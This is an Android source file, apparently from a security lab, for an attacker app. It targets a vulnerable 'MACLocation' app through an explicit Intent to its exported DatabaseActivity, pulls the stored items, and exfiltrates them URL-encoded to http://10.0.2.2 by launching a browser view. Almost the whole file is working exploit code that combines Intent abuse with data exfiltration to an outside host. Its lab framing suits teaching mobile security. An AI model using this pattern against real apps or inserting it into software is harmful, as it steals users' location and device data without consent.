package lbs.lab.macintent;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;

import java.util.ArrayList;

import lbs.lab.maclocation.Item;

// ************************************************************
// ** Read and edit this file *********************************
// ************************************************************

/**
 * Activity that should get data via an Intent, then exfiltrate it through the browser.
 */
public class MainActivity extends AppCompatActivity {

    // unique code for the request Intent
    private static final int CODE = 6;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /**
     * This function is called when the button is clicked, and should start the process
     * of exploiting the vulnerable MACLocation application through an Intent.
     *
     * @param view - the button clicked
     */
    public void act(View view) {
        Intent i = new Intent();

        i.setClassName("lbs.lab.maclocation", "lbs.lab.maclocation.DatabaseActivity");
        i.setType("lbs.lab.maclocation.DatabaseActivity");
        i.putExtra("ITEM_ACTION", "GET_ITEMS_ACTION");
        startActivityForResult(i, CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // once the MACLocation Activity has received the intent in act()
        // we have to handle the data we receive back
        // do this in the same way we exfiltrated data before
        ArrayList<Item> items = data.getParcelableArrayListExtra("ITEMS_GET");

        StringBuilder dataToExfiltrate = new StringBuilder();
        if (items != null) {
            for (lbs.lab.maclocation.Item item : items) {
                dataToExfiltrate.append(item.getInfo()).append("\n");
            }
        }

        try {
            String encodedData = java.net.URLEncoder.encode(dataToExfiltrate.toString(), "UTF-8");
            String url = "http://10.0.2.2?data=" + encodedData;
            Intent exfiltrateIntent = new Intent(Intent.ACTION_VIEW);
            exfiltrateIntent.setData(Uri.parse(url));
            startActivity(exfiltrateIntent);
        } catch (Exception ignored) {
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
